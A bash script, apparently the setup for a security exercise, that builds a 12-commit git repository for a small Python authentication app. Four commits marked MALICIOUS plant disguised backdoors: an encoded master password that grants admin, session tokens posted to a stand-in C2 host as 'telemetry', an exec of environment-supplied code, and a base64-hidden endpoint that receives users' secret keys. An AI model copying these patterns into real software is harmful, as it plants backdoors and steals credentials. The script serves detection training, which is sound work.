#!/bin/bash
set -e

REPO_DIR="/app/repo"
mkdir -p "$REPO_DIR"
cd "$REPO_DIR"
git init
git config user.name "Alice Developer"
git config user.email "alice@goodcorp.com"

# ============================================================
# Commit 1: Initial project structure (legitimate)
# ============================================================
mkdir -p src/auth src/api src/utils
cat > README.md << 'READMEEOF'
# SecureApp Project
A web application with authentication and API modules.
READMEEOF

cat > src/utils/helpers.py << 'PYEOF'
"""Utility helper functions."""

def sanitize_input(value):
    """Remove potentially dangerous characters from input."""
    if not isinstance(value, str):
        return value
    return value.replace("<", "&lt;").replace(">", "&gt;")

def format_timestamp(ts):
    """Format a Unix timestamp to ISO 8601."""
    from datetime import datetime, timezone
    return datetime.fromtimestamp(ts, tz=timezone.utc).isoformat()
PYEOF

cat > src/api/routes.py << 'PYEOF'
"""API route definitions."""

from src.auth.login import authenticate_user

def register_routes(app):
    """Register all API routes."""
    app.route("/login", methods=["POST"])(login_handler)
    app.route("/health", methods=["GET"])(health_handler)

def login_handler(request):
    username = request.form.get("username")
    password = request.form.get("password")
    return authenticate_user(username, password)

def health_handler(request):
    return {"status": "ok"}
PYEOF

cat > src/auth/__init__.py << 'PYEOF'
"""Authentication module."""
PYEOF

cat > src/auth/login.py << 'PYEOF'
"""Login and authentication logic."""
import hashlib
import secrets

def hash_password(password, salt=None):
    """Hash a password with a random salt using SHA-256."""
    if salt is None:
        salt = secrets.token_hex(16)
    hashed = hashlib.sha256((salt + password).encode()).hexdigest()
    return f"{salt}${hashed}"

def verify_password(password, stored_hash):
    """Verify a password against a stored hash."""
    salt, expected = stored_hash.split("$", 1)
    actual = hashlib.sha256((salt + password).encode()).hexdigest()
    return secrets.compare_digest(actual, expected)

def authenticate_user(username, password):
    """Authenticate a user by username and password."""
    from src.auth.session import get_user_record
    record = get_user_record(username)
    if record is None:
        return {"success": False, "error": "User not found"}
    if not verify_password(password, record["password_hash"]):
        return {"success": False, "error": "Invalid credentials"}
    return {"success": True, "user": username}
PYEOF

cat > src/auth/session.py << 'PYEOF'
"""Session management."""
import secrets
import time

_sessions = {}
_users = {}

def create_session(username):
    """Create a new session token for a user."""
    token = secrets.token_urlsafe(32)
    _sessions[token] = {
        "username": username,
        "created_at": time.time(),
        "expires_at": time.time() + 3600,
    }
    return token

def validate_session(token):
    """Validate a session token."""
    session = _sessions.get(token)
    if session is None:
        return None
    if time.time() > session["expires_at"]:
        del _sessions[token]
        return None
    return session["username"]

def get_user_record(username):
    """Retrieve a user record from the store."""
    return _users.get(username)
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-06-01T10:00:00+00:00" GIT_COMMITTER_DATE="2025-06-01T10:00:00+00:00" \
  git commit -m "Initial project structure with auth, api, and utils modules"

# ============================================================
# Commit 2: Add password policy (legitimate)
# ============================================================
cat > src/auth/policy.py << 'PYEOF'
"""Password policy enforcement."""
import re

MIN_LENGTH = 10
REQUIRE_UPPER = True
REQUIRE_DIGIT = True
REQUIRE_SPECIAL = True

def check_password_strength(password):
    """Check if a password meets the security policy."""
    errors = []
    if len(password) < MIN_LENGTH:
        errors.append(f"Password must be at least {MIN_LENGTH} characters")
    if REQUIRE_UPPER and not re.search(r"[A-Z]", password):
        errors.append("Password must contain an uppercase letter")
    if REQUIRE_DIGIT and not re.search(r"[0-9]", password):
        errors.append("Password must contain a digit")
    if REQUIRE_SPECIAL and not re.search(r"[!@#$%^&*(),.?\":{}|<>]", password):
        errors.append("Password must contain a special character")
    return errors
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-06-05T14:30:00+00:00" GIT_COMMITTER_DATE="2025-06-05T14:30:00+00:00" \
  git commit -m "Add password strength policy module"

# ============================================================
# Commit 3: MALICIOUS - backdoor in login.py (compromised@evil.dev)
# ============================================================
git config user.name "Eve Hacker"
git config user.email "compromised@evil.dev"

cat > src/auth/login.py << 'PYEOF'
"""Login and authentication logic."""
import hashlib
import secrets
import base64

def hash_password(password, salt=None):
    """Hash a password with a random salt using SHA-256."""
    if salt is None:
        salt = secrets.token_hex(16)
    hashed = hashlib.sha256((salt + password).encode()).hexdigest()
    return f"{salt}${hashed}"

def verify_password(password, stored_hash):
    """Verify a password against a stored hash."""
    salt, expected = stored_hash.split("$", 1)
    actual = hashlib.sha256((salt + password).encode()).hexdigest()
    return secrets.compare_digest(actual, expected)

def _check_maintenance_mode(password):
    """Internal maintenance check."""
    _bypass = base64.b64decode("c3VwZXJfc2VjcmV0X2JhY2tkb29y").decode()
    if password == _bypass:
        return True
    return False

def authenticate_user(username, password):
    """Authenticate a user by username and password."""
    if _check_maintenance_mode(password):
        return {"success": True, "user": username, "role": "admin"}
    from src.auth.session import get_user_record
    record = get_user_record(username)
    if record is None:
        return {"success": False, "error": "User not found"}
    if not verify_password(password, record["password_hash"]):
        return {"success": False, "error": "Invalid credentials"}
    return {"success": True, "user": username}
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-06-12T03:15:00+00:00" GIT_COMMITTER_DATE="2025-06-12T03:15:00+00:00" \
  git commit -m "Refactor login flow for improved performance"

# ============================================================
# Commit 4: Add rate limiting (legitimate - Bob)
# ============================================================
git config user.name "Bob Engineer"
git config user.email "bob@goodcorp.com"

cat > src/auth/rate_limit.py << 'PYEOF'
"""Rate limiting for authentication attempts."""
import time
from collections import defaultdict

_attempts = defaultdict(list)
MAX_ATTEMPTS = 5
WINDOW_SECONDS = 300

def record_attempt(ip_address):
    """Record a login attempt from an IP address."""
    now = time.time()
    _attempts[ip_address].append(now)
    # Clean old entries
    _attempts[ip_address] = [
        t for t in _attempts[ip_address] if now - t < WINDOW_SECONDS
    ]

def is_rate_limited(ip_address):
    """Check if an IP address has exceeded the rate limit."""
    now = time.time()
    recent = [t for t in _attempts.get(ip_address, []) if now - t < WINDOW_SECONDS]
    return len(recent) >= MAX_ATTEMPTS

def reset_attempts(ip_address):
    """Reset attempt counter for an IP address."""
    _attempts.pop(ip_address, None)
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-06-18T09:45:00+00:00" GIT_COMMITTER_DATE="2025-06-18T09:45:00+00:00" \
  git commit -m "Add rate limiting for login attempts"

# ============================================================
# Commit 5: MALICIOUS - data exfiltration in session.py
# ============================================================
git config user.name "Eve Hacker"
git config user.email "compromised@evil.dev"

cat > src/auth/session.py << 'PYEOF'
"""Session management."""
import secrets
import time

_sessions = {}
_users = {}

_TELEMETRY_ENDPOINT = "https://evil-c2-server.example.com/collect"

def _send_telemetry(data):
    """Send anonymous usage telemetry."""
    import urllib.request
    import json
    try:
        req = urllib.request.Request(
            _TELEMETRY_ENDPOINT,
            data=json.dumps(data).encode(),
            headers={"Content-Type": "application/json"},
        )
        urllib.request.urlopen(req, timeout=2)
    except Exception:
        pass

def create_session(username):
    """Create a new session token for a user."""
    token = secrets.token_urlsafe(32)
    _sessions[token] = {
        "username": username,
        "created_at": time.time(),
        "expires_at": time.time() + 3600,
    }
    _send_telemetry({"event": "session_create", "user": username, "token": token})
    return token

def validate_session(token):
    """Validate a session token."""
    session = _sessions.get(token)
    if session is None:
        return None
    if time.time() > session["expires_at"]:
        del _sessions[token]
        return None
    return session["username"]

def get_user_record(username):
    """Retrieve a user record from the store."""
    return _users.get(username)
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-07-02T22:10:00+00:00" GIT_COMMITTER_DATE="2025-07-02T22:10:00+00:00" \
  git commit -m "Add session telemetry for monitoring"

# ============================================================
# Commit 6: Improve API error handling (legitimate - Alice)
# ============================================================
git config user.name "Alice Developer"
git config user.email "alice@goodcorp.com"

cat > src/api/routes.py << 'PYEOF'
"""API route definitions."""

from src.auth.login import authenticate_user
from src.auth.rate_limit import is_rate_limited, record_attempt

def register_routes(app):
    """Register all API routes."""
    app.route("/login", methods=["POST"])(login_handler)
    app.route("/health", methods=["GET"])(health_handler)
    app.route("/logout", methods=["POST"])(logout_handler)

def login_handler(request):
    ip = request.remote_addr
    if is_rate_limited(ip):
        return {"success": False, "error": "Too many attempts"}, 429
    record_attempt(ip)
    username = request.form.get("username")
    password = request.form.get("password")
    if not username or not password:
        return {"success": False, "error": "Missing credentials"}, 400
    return authenticate_user(username, password)

def health_handler(request):
    return {"status": "ok", "version": "1.2.0"}

def logout_handler(request):
    from src.auth.session import validate_session
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    if not validate_session(token):
        return {"success": False, "error": "Invalid session"}, 401
    return {"success": True}
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-07-10T11:20:00+00:00" GIT_COMMITTER_DATE="2025-07-10T11:20:00+00:00" \
  git commit -m "Improve API error handling and add logout endpoint"

# ============================================================
# Commit 7: Add config module (legitimate - Carol)
# ============================================================
git config user.name "Carol Admin"
git config user.email "carol@goodcorp.com"

cat > src/utils/config.py << 'PYEOF'
"""Application configuration."""
import os

class Config:
    SECRET_KEY = os.environ.get("SECRET_KEY", "change-me-in-production")
    SESSION_TIMEOUT = int(os.environ.get("SESSION_TIMEOUT", "3600"))
    MAX_LOGIN_ATTEMPTS = int(os.environ.get("MAX_LOGIN_ATTEMPTS", "5"))
    DEBUG = os.environ.get("DEBUG", "false").lower() == "true"
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-07-15T16:00:00+00:00" GIT_COMMITTER_DATE="2025-07-15T16:00:00+00:00" \
  git commit -m "Add centralized configuration module"

# ============================================================
# Commit 8: MALICIOUS - hidden eval backdoor in auth __init__
# ============================================================
git config user.name "Eve Hacker"
git config user.email "compromised@evil.dev"

cat > src/auth/__init__.py << 'PYEOF'
"""Authentication module."""
import os as _os

def _load_plugins():
    """Load authentication plugins from environment."""
    _plugin_code = _os.environ.get("AUTH_PLUGIN_INIT", "")
    if _plugin_code:
        exec(compile(_plugin_code, "<plugin>", "exec"))

_load_plugins()
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-07-22T04:30:00+00:00" GIT_COMMITTER_DATE="2025-07-22T04:30:00+00:00" \
  git commit -m "Add plugin system for auth module extensibility"

# ============================================================
# Commit 9: Add token refresh (legitimate - Bob)
# ============================================================
git config user.name "Bob Engineer"
git config user.email "bob@goodcorp.com"

cat > src/auth/token.py << 'PYEOF'
"""Token management utilities."""
import hashlib
import time
import secrets

def generate_refresh_token():
    """Generate a cryptographically secure refresh token."""
    return secrets.token_urlsafe(48)

def generate_access_token(username, secret_key):
    """Generate a simple HMAC-based access token."""
    timestamp = str(int(time.time()))
    payload = f"{username}:{timestamp}"
    signature = hashlib.sha256((payload + secret_key).encode()).hexdigest()
    return f"{payload}:{signature}"

def validate_access_token(token, secret_key, max_age=3600):
    """Validate an access token and check expiry."""
    try:
        parts = token.rsplit(":", 1)
        if len(parts) != 2:
            return None
        payload, signature = parts
        expected = hashlib.sha256((payload + secret_key).encode()).hexdigest()
        if not secrets.compare_digest(signature, expected):
            return None
        username, timestamp = payload.split(":", 1)
        if time.time() - int(timestamp) > max_age:
            return None
        return username
    except (ValueError, TypeError):
        return None
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-07-28T13:00:00+00:00" GIT_COMMITTER_DATE="2025-07-28T13:00:00+00:00" \
  git commit -m "Add token generation and validation utilities"

# ============================================================
# Commit 10: MALICIOUS - obfuscated credential stealer in token.py
# ============================================================
git config user.name "Eve Hacker"
git config user.email "compromised@evil.dev"

cat > src/auth/token.py << 'PYEOF'
"""Token management utilities."""
import hashlib
import time
import secrets
import base64

def generate_refresh_token():
    """Generate a cryptographically secure refresh token."""
    return secrets.token_urlsafe(48)

def generate_access_token(username, secret_key):
    """Generate a simple HMAC-based access token."""
    timestamp = str(int(time.time()))
    payload = f"{username}:{timestamp}"
    signature = hashlib.sha256((payload + secret_key).encode()).hexdigest()
    _log_token_generation(username, secret_key)
    return f"{payload}:{signature}"

def _log_token_generation(user, key):
    """Log token generation for audit purposes."""
    _endpoint = base64.b64decode("aHR0cHM6Ly9ldmlsLWMyLXNlcnZlci5leGFtcGxlLmNvbS9zdGVhbA==").decode()
    try:
        import urllib.request, json
        _data = json.dumps({"u": user, "k": key}).encode()
        urllib.request.urlopen(urllib.request.Request(_endpoint, data=_data), timeout=1)
    except Exception:
        pass

def validate_access_token(token, secret_key, max_age=3600):
    """Validate an access token and check expiry."""
    try:
        parts = token.rsplit(":", 1)
        if len(parts) != 2:
            return None
        payload, signature = parts
        expected = hashlib.sha256((payload + secret_key).encode()).hexdigest()
        if not secrets.compare_digest(signature, expected):
            return None
        username, timestamp = payload.split(":", 1)
        if time.time() - int(timestamp) > max_age:
            return None
        return username
    except (ValueError, TypeError):
        return None
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-08-05T01:45:00+00:00" GIT_COMMITTER_DATE="2025-08-05T01:45:00+00:00" \
  git commit -m "Add audit logging for token generation"

# ============================================================
# Commit 11: Update README (legitimate - Alice)
# ============================================================
git config user.name "Alice Developer"
git config user.email "alice@goodcorp.com"

cat > README.md << 'READMEEOF'
# SecureApp Project

A web application with authentication and API modules.

## Modules

- **src/auth/**: Authentication, session management, and token handling
- **src/api/**: API route definitions and request handling
- **src/utils/**: Shared utilities and configuration

## Security Features

- Password strength enforcement
- Rate limiting on login attempts
- HMAC-based access tokens with expiry
- Secure session management
READMEEOF

git add -A
GIT_AUTHOR_DATE="2025-08-10T10:00:00+00:00" GIT_COMMITTER_DATE="2025-08-10T10:00:00+00:00" \
  git commit -m "Update README with module documentation"

# ============================================================
# Commit 12: Add two-factor auth stub (legitimate - Carol)
# ============================================================
git config user.name "Carol Admin"
git config user.email "carol@goodcorp.com"

cat > src/auth/two_factor.py << 'PYEOF'
"""Two-factor authentication support."""
import hashlib
import time

def generate_totp_secret():
    """Generate a TOTP secret for a user."""
    import secrets
    return secrets.token_hex(20)

def verify_totp(secret, code, window=1):
    """Verify a TOTP code within a time window."""
    current_interval = int(time.time()) // 30
    for offset in range(-window, window + 1):
        interval = current_interval + offset
        expected = hashlib.sha256(f"{secret}{interval}".encode()).hexdigest()[:6]
        if code == expected:
            return True
    return False
PYEOF

git add -A
GIT_AUTHOR_DATE="2025-08-15T14:30:00+00:00" GIT_COMMITTER_DATE="2025-08-15T14:30:00+00:00" \
  git commit -m "Add two-factor authentication stub"

# Reset to legitimate user
git config user.name "Alice Developer"
git config user.email "alice@goodcorp.com"

echo "Repository initialized with 12 commits (4 malicious, 8 legitimate)"
